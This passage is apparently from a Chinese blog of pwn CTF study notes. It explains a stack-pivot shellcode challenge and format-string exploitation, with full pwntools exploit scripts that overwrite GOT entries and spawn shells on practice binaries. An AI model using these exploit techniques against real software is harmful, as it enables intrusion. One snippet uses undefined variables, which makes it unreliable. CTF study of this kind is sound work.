class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell_addr = base_addr+<span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(shell_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949630.png" alt="image-20240206212030568"></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a><code>pwn1</code></h2><h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><p>通过本题的学习与收获有：</p>
<ol>
<li>溢出一个字节也是溢出，如果只能覆盖<code>ebp</code>的一个字节，此时我们要想到栈迁移。且当我们是在<code>main</code>函数里的再一个函数里的栈帧时，此时已经有<code>2</code>次<code>leave ; ret</code>，不需要再写进<code>leave ; ret</code>。</li>
<li>栈迁移中<code>ret</code>的时候，我们<code>ret</code>的是装<code>shellcode</code>的的地址，而不是<code>shellcode</code>本身。</li>
<li>如果我们需要抬高栈帧，可以填充<code>ret</code>指令的地址。</li>
</ol>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949080.png" alt="image-20240324213348562" style="zoom:50%;" />

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>有栈溢出漏洞和格式化字符串漏洞</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949619.png" alt="image-20240324213659594"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949651.png" alt="image-20240324213537358"></p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>​	没有开启<code>NX</code>堆栈不可执行保护，那我们就可以通过执行<code>shellcode</code>获得<code>flag</code>。先把<code>shellcode</code>布置到栈上，然后<code>printf</code>泄漏一个栈地址通过计算偏移得到<code>shellcode</code>的地址。</p>
<p>先泄漏一个栈地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;following:&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p>​	又因为有一个栈溢出漏洞，可以覆盖<code>ebp</code>的最后一个字节，我们可以覆盖为我们布置<code>rop</code>链的地址的最后一个字节，以进行我们的栈迁移。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f_stack = stack-<span class="number">0x120</span>+<span class="number">0x70</span> <span class="comment">#stack是我们泄漏的一个栈地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(f_stack))</span><br><span class="line">one_byte = f_stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_byte  ------&gt;&gt;&#x27;</span>,one_byte)</span><br><span class="line">ret = <span class="number">0x0000000000401016</span>  </span><br><span class="line">payload = p64(ret)*<span class="number">12</span>  <span class="comment">#抬高栈帧，用ret指令抬高</span></span><br><span class="line">payload+= p64(f_stack-<span class="number">8</span>)+shellcode</span><br><span class="line"><span class="comment">#f_stack是shellcode的地址，-8是为了到时候第二个pop ebp时，弹出shellcode的地址的前一个内存单元中的内容(也就是f_stack-8这个数据)，而不是弹出shellcode给ebp，然后ret(pop eip)就能弹出shellcode给eip</span></span><br><span class="line">payload = (payload).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p8(one_byte-<span class="number">24</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x40140e</span>,<span class="number">0x401327</span>,<span class="number">0x4013ac</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;following:&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">f_stack = stack-<span class="number">0x120</span>+<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(f_stack))</span><br><span class="line">one_byte = f_stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_byte  ------&gt;&gt;&#x27;</span>,one_byte)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">payload = (p64(ret)*<span class="number">12</span>+p64(f_stack+<span class="number">16</span>-<span class="number">24</span>)+shellcode).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p8(one_byte-<span class="number">0x18</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞学习总结</title>
    <url>/2024/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="printf中的格式控制符"><a href="#printf中的格式控制符" class="headerlink" title="printf中的格式控制符"></a><code>printf</code>中的格式控制符</h2><p>​	格式控制符告诉函数如何解析和处理传递给它们的参数。如果<code>printf</code>中的格式控制符没有对应的参数，那么将会泄漏内存中的数据。一个<code>%</code>可以解析一个参数，也就是对应一个参数。</p>
<span id="more"></span>

<ul>
<li><p><code>%c</code>：以字符形式输出</p>
</li>
<li><p><code>%d</code>：以十进制整数形式输出</p>
</li>
<li><p><code>%x</code>：以十六进制形式输出，<code>%7$x</code>表示输出参数列表中的第七个参数</p>
</li>
<li><p><code>%p</code>：以十六进制形式输出，并加上前缀<code>0x</code></p>
</li>
<li><p><code>%n</code>：将<code>%n</code>之前<code>printf</code>已经打印的字符个数赋值给偏移处指针所指向的地址位置。</p>
<ul>
<li><code>%n</code>：写入的地址空间为<code>4</code>个字节</li>
<li><code>%hn</code>：写入的地址空间为<code>2</code>个字节</li>
<li><code>%hhn</code>：写入的地址空间为<code>1</code>个字节</li>
<li><code>%lln</code>：写入的地址空间为<code>8</code>个字节</li>
</ul>
</li>
</ul>
<h2 id="pwntools中的fmtstr-paylod"><a href="#pwntools中的fmtstr-paylod" class="headerlink" title="pwntools中的fmtstr_paylod"></a><code>pwntools</code>中的<code>fmtstr_paylod</code></h2><p>​	<code>fmtstr_payload</code>是<code>pwntools</code>中的一个函数，其函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,writes,numbwritten,write_size)</span><br><span class="line"><span class="comment">#offset是格式化字符串漏洞的偏移量</span></span><br><span class="line"><span class="comment">#writes是一个字典，用于指定要写入的值和地址，结构如下</span></span><br><span class="line">write=&#123;</span><br><span class="line">    addr_1:value_1,</span><br><span class="line">	addr_2:value_2,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#numbwritten参数表示前面已经写入的字节数</span></span><br><span class="line"><span class="comment">#write_size参数表示写入的字节大小，默认为&#x27;byte&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="非栈上的格式化字符串漏洞"><a href="#非栈上的格式化字符串漏洞" class="headerlink" title="非栈上的格式化字符串漏洞"></a>非栈上的格式化字符串漏洞</h2><p>​	我们通常所说的在栈上的格式化字符串漏洞的意思就是我们可以直接把数据写到栈上，然后对栈上的数据进行一系列的攻击。如<code>A</code>是栈上的一个地址，<code>B</code>是我们要写到<code>A</code>里的<code>printf</code>的<code>got</code>表值，那么现在就是<code>A -&gt; B -&gt; C</code>，<code>C</code>是<code>printf</code>函数的<code>plt</code>表值。然后我们可以修改<code>B</code>这个地址中的内容即<code>C</code>，改成后门函数的地址。而非栈上的格式化字符串漏洞就是我们不能直接把<code>B</code>写到栈上，但是依然可以泄漏和修改栈中的地址等数据。如果我们不能直接把<code>B</code>写到栈上，我们可以先在栈上找到<code>D -&gt; E -&gt; F</code>把<code>F</code>修改成<code>B</code>就变成了<code>D -&gt; E -&gt; B</code>，但是我们最后的目的是修改<code>B</code>指向的地址，所以说这里的<code>E</code>必须是与<code>A</code>和<code>D</code>一样的栈地址，那么<code>E -&gt; F</code>就变成了<code>E -&gt; B -&gt; C</code>，又回到了栈上。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><code>jarvisoj_fm</code></h2><p>​	先看主函数，直接给我们<code>system(&quot;/bin/sh&quot;)</code>，当<code>x == 4</code>的时候才能执行这个函数。我们看到第<code>10</code>行有个<code>printf(buf)</code>再结合第<code>9</code>行，不难知道这是一个格式化字符串漏洞。那我们就可以利用这个漏洞把<code>x</code>写成<code>4</code>，就可以拿到<code>shell</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png" alt="image-20240131182232759"></p>
<p>​	先计算偏移量，偏移量为<code>11</code>，然后构造<code>payload</code>。我们要写入的内容是<code>4</code>，巧的是我们要写入的地址也是<code>4</code>个字节，所以我们直接发送地址就可以写了，<code>payload = p32(value_addr)+b&#39;%11$n&#39;</code>。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">value_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(value_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931380.png" alt="image-20240129124847881"></p>
<p>​	我们看到<code>read</code>函数，可以读入<code>0x100(256)</code>个字节，而<code>s</code>的长度为<code>257</code>，因此没有办法溢出。继续往下看，<code>printf(format)</code>这一行明显存在格式化字符串漏洞，程序中也没有<code>system</code>函数和<code>/bin/sh</code>字符串。那大概思路就是利用格式化字符串漏洞泄漏<code>printf</code>的地址（本来我想修改<code>read</code>的<code>got</code>表值的，但是后来才相等修改后就相当于程序中没有<code>read</code>函数了，这样肯定是不行的），算出<code>libc</code>基地址以及<code>system</code>函数地址。</p>
<p>​	怎么泄漏<code>printf</code>的地址呢？本题中我们通过<code>read</code>函数将输入的内容写到<code>s</code>中，而<code>s</code>又是<code>printf</code>函数的参数，因此我们可以利用格式化字符串漏洞去泄漏栈上的内容，因此可以先把<code>printf</code>在<code>got</code>表中值写到栈上，再去泄漏程序运行起来后<code>printf</code>在<code>got</code>表中的地址即<code>printf</code>的真实地址。这就需要计算我们写入的内容在栈上的位置的偏移量，输入<code>aaaa %p %p %p %p %p %p %p %p %p %p %p</code>得到输出的内容数一下偏移量为<code>8</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931580.png" alt="image-20240129132814049"></p>
<p>​	不过我们也发现了<code>0x20616161</code>中只有<code>3</code>个<code>a</code>，是因为<code>format</code>中还有<code>Repeater:</code>这些字符的原因，所以我们尝试着再输入<code>Aaaaa %p %p %p %p %p %p %p %p</code>，发现<code>0x61616161</code>刚好就是<code>aaaa</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931608.png" alt="image-20240129140029043"></p>
<p>​	得到偏移量后可以开始构造第一个<code>payload</code>泄漏<code>printf</code>地址了，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br></pre></td></tr></table></figure>

<p>​	得到<code>printf</code>真实地址后，可以计算<code>libc</code>基地址以及<code>system</code>函数的地址，并把<code>printf</code>的<code>got</code>表值改成<code>system</code>函数的地址，这样再次传入参数 <code>&#39;/bin/sh&#39;</code> 再执行<code>printf</code>时，由于将<code>got</code>表给修改了，就相当于执行了<code>system</code> 函数 即：执行<code>system(&#39;/bin/sh&#39;)</code>。这也解释了为什么刚开始我改<code>puts</code>函数的<code>got</code>表不行，因为就算把<code>puts</code>的<code>got</code>表的值改成<code>system</code>函数的<code>got</code>表值，我们后面也不会再执行<code>puts</code>函数，也就执行不了<code>system</code>函数。</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>​	题目如果是<code>32</code>位的程序，可以用<code>pwntools</code>中的<code>fmtstr_payload</code>函数直接修改地址，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931998.png" alt="image-20240129144017329"></p>
<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>一个字节一个字节的修改，这个方法对<code>32</code>位和<code>64</code>位的都适用。</p>
<p>​	先把两个地址打印出来，发现四个字节中只有最高字节<code>f7</code>是一样的，我们们需要修改后<code>3</code>个字节，也就是需要这样修改<code>e3 --&gt; e2</code>，<code>10 --&gt; 29</code>，<code>20 --&gt; 40</code>（当然地址是不确定的，肯定不能直接改数字）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931794.png" alt="image-20240130161627843"></p>
<p>​	虽然每次地址都会变化，但是我们可以把每次的地址表示出来。<code>sys_addr&amp;0xff</code>将<code>sys_addr</code>与<code>0xff</code>进行按位与运算，得到的结果把<code>sys_addr</code>的低<code>8</code>位（<code>8</code>位<code>1</code>个字节）保留下来了，高位被全部置零。<code>sys_addr&amp;0xff00</code>将<code>sys_addr</code>二进制形式的第<code>9</code>到<code>16</code>位保存下来了，其他位全部置零举个例子就是<code>11111111 11111111 11111111</code>变成了<code>00000000 11111111 00000000</code>。<code>&gt;&gt;8</code>是再将结果右移<code>8</code>位即<code>00000000 11111111 00000000</code>变成了<code>00000000 11111111</code>。<code>(sys_addr&amp;0xff00)&gt;&gt;8</code>就是把<code>sys_addr</code>的倒数第二个字节保留下来了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931920.png" alt="image-20240130175341704" style="zoom:67%;" />

<p>​	然后下面这一步中<code>sys_addr1-(9+13)</code>减的是<code>printf</code>中前面参数字节的总和，程序中的<code>Repeater:</code>是<code>9</code>个字节，<code>payload2 = b&#39;a&#39;+p32(strlen_got)+p32(strlen_got+1)+p32(strlen_dot+2)</code>一共<code>13</code>个字节。（其实为什么要这样我也不知道）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br><span class="line">result = system_addr_4-system_addr_3</span><br><span class="line">system_addr_4_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	最后构造<code>payload2</code>，<code>bytes(str(sys_addr1_value),encoding=&#39;utf-8&#39;)</code>的意思是把<code>sys_addr1-value</code>转换为字节串<code>bytes</code>类型。<code>%hhn</code>是修改低<code>1</code>个字节，<code>printf_got+1</code>会把<code>printf_got</code>的倒数第二个字节变成倒数第一个，然后就可以修改低<code>2</code>个字节了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931882.png" alt="image-20240130173634524"></p>
<h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><code>axb_2019_fmt64</code></h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931312.png" alt="image-20240130200837648"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	第一步，计算偏移量为<code>8</code></p>
<p>​	<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931509.png" alt="image-20240130130959078"></p>
<p>​	到了与<code>32</code>位程序不一样的地方了，泄漏地址这里如果是按照<code>32</code>的写成<code>payload = p64(puts)+b&#39;%8$saaaa&#39;</code>，然后我们看到发送的数据在<code>puts_got</code>与<code>%8$s</code>之间有很多<code>&#39;00&#39;</code>，字符串中的<code>&#39;00&#39;</code>就代表结束，所以在<code>printf</code>到<code>&#39;00&#39;</code>的时候就以为字符串后面没有内容了，后面的内容也就不会被<code>printf</code>了。</p>
